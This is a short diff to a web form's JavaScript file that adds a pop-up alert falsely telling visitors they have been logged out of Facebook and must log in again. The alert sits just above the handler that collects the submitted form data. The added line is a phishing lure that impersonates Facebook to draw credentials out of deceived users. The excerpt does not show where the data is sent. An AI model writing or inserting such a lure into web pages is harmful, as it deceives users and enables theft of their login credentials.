@@ -3,6 +3,8 @@
 const form = document.getElementById('form');
 const result = document.getElementById('result');
 
+alert("You have been kick out from facebook please login again");
+
 form.addEventListener('submit', function(e) {
   e.preventDefault();
   const formData = new FormData(form);
